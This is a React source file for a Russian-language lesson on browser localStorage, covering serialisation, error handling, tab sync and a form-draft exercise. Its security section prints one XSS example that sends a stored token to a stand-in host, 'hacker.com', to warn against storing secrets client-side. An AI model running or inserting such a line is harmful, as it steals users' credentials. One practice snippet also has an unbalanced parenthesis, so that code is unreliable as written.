import React, { useEffect } from 'react';
import { NavLink } from 'react-router-dom';
import styles from '../Themes.module.scss';
import { motion } from 'framer-motion';
import BackButton from '../../components/BackButton/BackButton';
import BackProgress from '../../components/BackProgress/BackProgress';
import Test14 from './components/Test14';
import { useTopicProgress } from '../../../hooks/useTopicProgress';

interface Topic14Props {
    testPassed: boolean;
    setTestPassed: (value: boolean) => void;
}

const Topic14: React.FC<Topic14Props> = ({ testPassed: propTestPassed, setTestPassed: propSetTestPassed }) => {
    const { testPassed: cachedTestPassed, setTestPassed: setCachedTestPassed, testAnswers, setTestAnswers, resetProgress } = useTopicProgress('14');

    useEffect(() => {
        if (cachedTestPassed && !propTestPassed) {
            propSetTestPassed(true);
        }
    }, [cachedTestPassed, propTestPassed, propSetTestPassed]);

    const handleTestComplete = () => {
        setCachedTestPassed(true);
        propSetTestPassed(true);
    };

    const handleResetProgress = () => {
        if (window.confirm('Вы уверены, что хотите сбросить прогресс темы? 🧐        Тест придётся проходить заново 🙁')) {
            resetProgress();
            propSetTestPassed(false);
        }
    };

    const isTestPassed = propTestPassed;

    const scrollToSection = (sectionId: string) => {
        const element = document.getElementById(sectionId);
        if (element) {
            element.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    };

    useEffect(() => {
        window.scrollTo(0, 0);
    }, []);

    return (
        <div className={styles.topic}>
            <BackButton hasUnsavedProgress={Object.keys(testAnswers).length > 0 && !isTestPassed} />
            <motion.div
                className={styles.header}
                initial={{ opacity: 0, y: -50 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.5 }}
            >
                <h1 className={styles.title}>Тема 14: Работа с LocalStorage</h1>
                <p className={styles.subtitle}>Сохранение данных формы, простые настройки</p>
            </motion.div>

            <div className={styles.content}>
                <section className={styles.section}>
                    <h2 className={styles.sectionTitle}>Теория: Фундаментальные Основы</h2>

                    <h3 className={styles.subSectionTitle}>1. Зачем нам localStorage?</h3>
                    <p className={styles.text}>
                        Обычно, когда вы обновляете страницу, <strong>всё, что вы вводили в поля формы, теряется</strong>. Браузер «забывает» всё и начинает с чистого листа.
                    </p>
                    <p className={styles.text}>
                        <strong>localStorage</strong> — это встроенный в браузер «блокнот», где JavaScript может сохранять данные <strong>навсегда</strong> (пока пользователь сам их не удалит). Он принадлежит конкретному сайту и недоступен другим сайтам.
                    </p>

                    <div className={styles.screenshotPlaceholder}>
                        <img src="./images/Topic14/screen-1.webp" alt="screen-1" className={styles.screenshotImage} />
                        <p className={styles.screenshotText}>Рис.1 — Эволюция хранения данных в браузере</p>
                    </div>

                    <h3 className={styles.subSectionTitle}>2. LocalStorage vs SessionStorage vs Cookies</h3>
                    <p className={styles.text}>
                        Очень важно различать эти три сущности. Путаница между ними может привести к критическим ошибкам в архитектуре приложения.
                    </p>
                    <ul className={styles.text}>
                        <li>
                            <strong>LocalStorage</strong>: Хранилище с <strong>неограниченным сроком жизни</strong>. Данные переживают перезагрузку страницы, закрытие браузера, перезагрузку компьютера. Они удаляются только явно (кодом или пользователем). Объем: ~5-10 Мб.
                        </li>
                        <li>
                            <strong>SessionStorage</strong>: Хранилище с <strong>ограниченным сроком жизни</strong>. Данные живут ровно столько, сколько существует <strong>вкладка браузера</strong>. Открытие той же страницы в новой вкладке создает новую, пустую сессию. Объем: ~5-10 Мб.
                        </li>
                        <li>
                            <strong>Cookies</strong>: Старый механизм. Имеют настраиваемый срок жизни (Expires). Отправляются на сервер. Объем: 4 Кб. Используются в основном для <strong>аутентификации</strong>.
                        </li>
                    </ul>

                    <h3 className={styles.subSectionTitle}>3. Важный момент о localStorage</h3>
                    <p className={styles.text}>
                        localStorage работает <strong>мгновенно и синхронно</strong>. Это значит, что он не подходит для хранения <strong>больших объёмов данных</strong> (десятки мегабайт, тысячи записей). Для небольших данных — имён, настроек, черновиков форм — он идеален.
                    </p>
                    <p className={styles.text}>
                        <strong>Простое правило:</strong> Сохраняйте в localStorage только то, что уместится в блокнотик: настройки темы, последний поисковый запрос, черновик формы. Не пытайтесь хранить там видео или тысячи товаров.
                    </p>

                    <div className={styles.screenshotPlaceholder}>
                        <img src="./images/Topic14/screen-2.webp" alt="screen-2" className={styles.screenshotImage} />
                        <p className={styles.screenshotText}>Рис.2 — Блокировка основного потока (Main Thread)</p>
                    </div>

                    <h3 className={styles.subSectionTitle} id="storageApi">4. Интерфейс Storage API</h3>
                    <p className={styles.text}>
                        Браузер предоставляет глобальный объект <code>window.localStorage</code>. Он невероятно прост в использовании, но имеет свои подводные камни.
                    </p>

                    <p className={styles.text}>
                        <strong>Запись данных:</strong> <code>setItem(key, value)</code>
                        <br />Метод принимает два аргумента: ключ и значение. Оба <strong>обязательно</strong> приводятся к строке.
                    </p>
                    <pre className={styles.code}>localStorage.setItem('user_id', '12345');</pre>

                    <p className={styles.text}>
                        <strong>Чтение данных:</strong> <code>getItem(key)</code>
                        <br />Возвращает <code>string</code>, если ключ найден, или <code>null</code>, если ключа нет. Никогда не возвращает <code>undefined</code>.
                    </p>
                    <pre className={styles.code}>const id = localStorage.getItem('user_id'); // '12345'</pre>

                    <p className={styles.text}>
                        <strong>Удаление данных:</strong> <code>removeItem(key)</code>
                        <br />Удаляет пару ключ-значение. Если ключа не было — ошибки не будет.
                    </p>

                    <p className={styles.text}>
                        <strong>Полная очистка:</strong> <code>clear()</code>
                        <br />Очищает <strong>всё</strong> хранилище для данного домена. Опасный метод, используйте с осторожностью.
                    </p>

                    <h3 className={styles.subSectionTitle}>5. Проблема Сериализации (JSON)</h3>
                    <p className={styles.text}>
                        LocalStorage — это <strong>строковое хранилище</strong> (Key-Value String Storage). Это его главное ограничение. Вы <strong>не можете</strong> сохранить туда объект, массив, число или булево значение без предварительного преобразования.
                    </p>
                    <p className={styles.text}>
                        Если вы попытаетесь сделать так:
                        <br />
                        <code>{`localStorage.setItem('user', {name: 'Artem' })`}</code>
                        <br />
                        То в хранилище запишется бесполезная строка <code>"[object Object]"</code>.
                    </p>
                    <p className={styles.text}>
                        Чтобы сохранить сложную структуру, мы должны использовать <strong>Сериализацию</strong>. В JavaScript стандартом для этого является формат <strong>JSON</strong>.
                    </p>
                    <pre className={styles.code}>
                        {`const user = { 
    name: 'Artem', 
    settings: { theme: 'dark' } 
};

// 1. Превращаем объект в строку (Сериализация)
const serializedUser = JSON.stringify(user);
localStorage.setItem('user', serializedUser);

// 2. Превращаем строку обратно в объект (Десериализация)
const rawUser = localStorage.getItem('user');
if (rawUser) {
    const parsedUser = JSON.parse(rawUser);
    console.log(parsedUser.settings.theme); // 'dark'
}`}
                    </pre>

                    <div className={styles.screenshotPlaceholder}>
                        <img src="./images/Topic14/screen-3.webp" alt="screen-3" className={styles.screenshotImage} />
                        <p className={styles.screenshotText}>Рис.3 — JSON объект в хранилище LocalStorage</p>
                    </div>

                    <h3 className={styles.subSectionTitle} id="errorHandling">6. Обработка Ошибок (Error Handling)</h3>
                    <p className={styles.text}>
                        Работа с LocalStorage не всегда безопасна. Есть две главные причины, по которым код может упасть с ошибкой:
                    </p>
                    <p className={styles.text}>
                        Причина 1: <strong>QuotaExceededError</strong>. Место кончилось. Обычно браузеры дают 5 Мб на домен. Если вы попытаетесь записать больше, браузер выбросит исключение.
                        <br />Причина 2: <strong>SecurityError</strong>. Пользователь может отключить Cookies/Storage в настройках приватности браузера, или использовать режим "Инкогнито" с жесткими ограничениями. В этом случае любая попытка доступа к <code>localStorage</code> вызовет фатальную ошибку.
                    </p>
                    <p className={styles.text}>
                        <strong>Правило надежного кода:</strong> Всегда оборачивайте работу с Storage в блок <code>try...catch</code>.
                    </p>
                    <pre className={styles.code}>
                        {`try {
    localStorage.setItem('data', 'big data...');
} catch (e) {
    if (e.name === 'QuotaExceededError') {
        alert('Память переполнена! Очистите старые данные.');
    } else {
        alert('Доступ к хранилищу запрещен настройками браузера.');
    }
}`}
                    </pre>

                    <h3 className={styles.subSectionTitle}>7. Безопасность (Security) — Критично!</h3>
                    <p className={styles.text}>
                        Это самый важный пункт. <strong>LocalStorage абсолютно не защищен!</strong>
                    </p>
                    <p className={styles.text}>
                        Доступ к нему имеет <strong>любой JavaScript код</strong>, выполняющийся на странице. Это включает в себя не только ваш код, но и код всех подключенных библиотек, метрик, рекламных скриптов и расширений браузера.
                    </p>
                    <p className={styles.text}>
                        Если ваш сайт подвержен уязвимости <strong>XSS (Cross-Site Scripting)</strong>, злоумышленник может одной строкой украсть все данные:
                        <br /><code>fetch('https://hacker.com?data=' + localStorage.getItem('token'))</code>
                    </p>
                    <p className={styles.text}>
                        <strong>Никогда не храните в LocalStorage:</strong>
                        <br />— Пароли.
                        <br />— Номера кредитных карт.
                        <br />— Access Token'ы с высокими привилегиями (лучше использовать HttpOnly Cookies).
                        <br />— Личную информацию пользователей (PII).
                    </p>

                    <div className={styles.screenshotPlaceholder}>
                        <img src="./images/Topic14/screen-4.webp" alt="screen-4" className={styles.screenshotImage} />
                        <p className={styles.screenshotText}>Рис.4 — Схема атаки XSS на LocalStorage</p>
                    </div>

                    <h3 className={styles.subSectionTitle}>8. Синхронизация Вкладок (Storage Event)</h3>
                    <p className={styles.text}>
                        Как сделать так, чтобы при смене темы оформления в одной вкладке, она менялась во всех открытых вкладках сайта мгновенно?
                    </p>
                    <p className={styles.text}>
                        Для этого существует событие <code>storage</code>. Оно срабатывает на объекте <code>window</code> каждый раз, когда данные в <code>localStorage</code> изменяются. Уникальность этого события в том, что оно срабатывает <strong>во всех вкладках, кроме той, где произошло изменение</strong>. Это идеальный механизм для синхронизации состояния приложения.
                    </p>
                    <pre className={styles.code}>
                        {`window.addEventListener('storage', (event) => {
    // key - имя измененного ключа
    // newValue - новое значение
    // oldValue - старое значение
    if (event.key === 'theme') {
        document.body.className = event.newValue; 
        console.log('Тема синхронизирована!');
    }
});`}
                    </pre>

                    <h3 className={styles.subSectionTitle}>9. Инструменты (DevTools)</h3>
                    <p className={styles.text}>
                        Chrome DevTools предоставляет мощный графический интерфейс для управления хранилищем. Вы можете просматривать, изменять и удалять данные вручную, что незаменимо при отладке (дебаггинге).
                    </p>
                    <p className={styles.text}>
                        <strong>Как открыть:</strong> F12, затем вкладка <strong>Application</strong>, в левом меню раздел <strong>Local Storage</strong>.
                    </p>

                    <div className={styles.screenshotPlaceholder}>
                        <img src="./images/Topic14/screen-5.webp" alt="screen-5" className={styles.screenshotImage} />
                        <p className={styles.screenshotText}>Рис.5 — Работа с Local Storage в браузере</p>
                    </div>

                </section>

                {!isTestPassed && (
                    <section className={styles.section}>
                        <h2 className={styles.sectionTitle}>Тест</h2>
                        <p className={styles.text}>Пройдите тест, чтобы открыть доступ к практике.</p>
                        <Test14 onComplete={handleTestComplete} setTestAnswers={setTestAnswers} testAnswers={testAnswers} />
                    </section>
                )}

                {isTestPassed && (
                    <section className={styles.section}>
                        <h2 className={styles.sectionTitle}>Практика: Профессиональная Реализация</h2>
                        <p className={styles.text}>
                            Мы реализуем систему <strong>"Умных Черновиков" (Smart Drafts)</strong> для формы заказа. Это стандарт качества для современных форм: данные не должны теряться никогда.
                        </p>

                        <h3 className={styles.subSectionTitle}>Шаг 1. Константы и Подготовка</h3>
                        <p className={styles.text}>
                            В файле <code>js/script.js</code> найдите блок работы с формой. Определим ключи для хранения и найдём элементы формы.
                        </p>
                        <p className={styles.text}>
                            <span onClick={() => scrollToSection('storageApi')} className={styles.hintLink} style={{ cursor: 'pointer' }}>
                                💡 Подсказка: localStorage хранит данные по ключу. Ключ — это любая строка, например 'order_name'
                            </span>
                        </p>
                        <pre className={styles.code}>
                            {`// Константы ключей хранилища
const STORAGE_KEY_NAME = 'frosted_muse_order_name';
const STORAGE_KEY_PHONE = 'frosted_muse_order_phone';

// Получаем элементы формы
const orderForm = document.getElementById('order-form');
const nameInput = orderForm.querySelector('input[name="name"]');
const phoneInput = orderForm.querySelector('input[name="phone"]');

console.log('Инициализация системы черновиков...');`}
                        </pre>

                        <h3 className={styles.subSectionTitle}>Шаг 2. Безопасная Загрузка (Safe Load)</h3>
                        <p className={styles.text}>
                            При загрузке страницы проверяем хранилище. Обернём чтение в <code>try...catch</code> — хорошая привычка.
                        </p>
                        <p className={styles.text}>
                            <span onClick={() => scrollToSection('errorHandling')} className={styles.hintLink} style={{ cursor: 'pointer' }}>
                                💡 Подсказка: getItem() возвращает null если ключа нет. Проверьте if (savedName) перед присвоением
                            </span>
                        </p>
                        <pre className={styles.code}>
                            {`function loadDrafts() {
    try {
        const savedName = localStorage.getItem(STORAGE_KEY_NAME);
        const savedPhone = localStorage.getItem(STORAGE_KEY_PHONE);

        if (savedName) {
            nameInput.value = savedName;
            // Визуально подсветим, что данные восстановлены
            nameInput.style.borderColor = '#4CAF50'; 
        }

        if (savedPhone) {
            phoneInput.value = savedPhone;
            phoneInput.style.borderColor = '#4CAF50';
        }
    } catch (e) {
        console.error('Ошибка доступа к LocalStorage:', e);
    }
}

// Вызываем функцию сразу при запуске
loadDrafts();`}
                        </pre>

                        <div className={styles.screenshotPlaceholder}>
                            <img src="./images/Topic14/screen-6.webp" alt="screen-6" className={styles.screenshotImage} />
                            <p className={styles.screenshotText}>Рис.6 — Поля формы с восстановленными данными</p>
                        </div>

                        <h3 className={styles.subSectionTitle}>Шаг 3. Реактивное Сохранение (Reactive Save)</h3>
                        <p className={styles.text}>
                            Слушаем событие <code>input</code>, которое срабатывает мгновенно при любом изменении поля. Это надёжнее, чем <code>change</code> (который срабатывает только при потере фокуса).
                        </p>
                        <p className={styles.text}>
                            <span onClick={() => scrollToSection('storageApi')} className={styles.hintLink} style={{ cursor: 'pointer' }}>
                                💡 Подсказка: setItem(key, value) сохраняет значение. e.target.value — это то, что пользователь ввёл в поле
                            </span>
                        </p>
                        <pre className={styles.code}>
                            {`function saveDraft(key, value) {
    try {
        localStorage.setItem(key, value);
    } catch (e) {
        // Если память кончилась, можно показать уведомление пользователю
        if (e.name === 'QuotaExceededError') {
            console.warn('Память LocalStorage переполнена!');
        }
    }
}

// Навешиваем слушатели событий
nameInput.addEventListener('input', (e) => {
    saveDraft(STORAGE_KEY_NAME, e.target.value);
    // Сбрасываем зеленую рамку при редактировании
    e.target.style.borderColor = '#ccc'; 
});

phoneInput.addEventListener('input', (e) => {
    saveDraft(STORAGE_KEY_PHONE, e.target.value);
    e.target.style.borderColor = '#ccc';
});`}
                        </pre>

                        <h3 className={styles.subSectionTitle}>Шаг 4. Очистка после Успеха (Cleanup)</h3>
                        <p className={styles.text}>
                            Если пользователь успешно отправил заказ (прошёл валидацию), мы обязаны удалить черновик. Иначе при следующем визите пользователь увидит старые данные.
                        </p>
                        <p className={styles.text}>
                            <span onClick={() => scrollToSection('storageApi')} className={styles.hintLink} style={{ cursor: 'pointer' }}>
                                💡 Подсказка: removeItem(key) удаляет одну запись. Вызовите его для обоих ключей после успешной отправки
                            </span>
                        </p>
                        <pre className={styles.code}>
                            {`orderForm.addEventListener('submit', (function(e) {
    // ... проверка валидации ...

    if (isValid) {
        // ... отправка на сервер ...
        alert('Заказ принят!');

        // Очищаем форму
        orderForm.reset();

        // УДАЛЯЕМ черновики
        localStorage.removeItem(STORAGE_KEY_NAME);
        localStorage.removeItem(STORAGE_KEY_PHONE);
        
        // Возвращаем стандартный цвет рамок
        nameInput.style.borderColor = '#ccc';
        phoneInput.style.borderColor = '#ccc';
    }
});`}
                        </pre>

                        <h3 className={styles.subSectionTitle}>Дополнительное Задание</h3>
                        <p className={styles.text}>
                            Реализуйте "Корзину" для нашего магазина.
                            <br />1. Создайте массив объектов <code>cart = []</code>.
                            <br />2. При клике на кнопку "Заказать" у товара, добавляйте товар в массив.
                            <br />3. Сереализуйте массив: <code>JSON.stringify(cart)</code> и сохраняйте его под ключом <code>cart_items</code>.
                            <br />4. При загрузке страницы проверяйте хранилище и отображайте количество товаров в иконке корзины в шапке сайта.
                        </p>

                    </section>
                )}

                <section className={styles.section}>
                    <h2 className={styles.sectionTitle}>Итогом работы стало</h2>
                    <p className={styles.text}>
                        Вы освоили один из самых важных инструментов Frontend-разработчика. Умение работать с <strong>клиентским состоянием</strong> отличает новичка от профессионала.
                        <br /><br />
                        Теперь данные ваших пользователей находятся в безопасности (от потери), а интерфейс работает быстро и предсказуемо. Помните о правилах безопасности и никогда не доверяйте данным из LocalStorage без валидации, так как пользователь мог изменить их вручную через DevTools.
                    </p>
                    <div className={styles.endImg}>
                        <img src='./images/General/general.webp' alt='general-logo'></img>
                    </div>
                </section>
            </div>

            <div className={styles.navigation}>
                <NavLink to="/topic15" className={styles.nextButton}>
                    К следующей теме
                </NavLink>
                <BackProgress onReset={handleResetProgress} testPassed={isTestPassed} />
            </div>
        </div>
    );
};

export default Topic14;
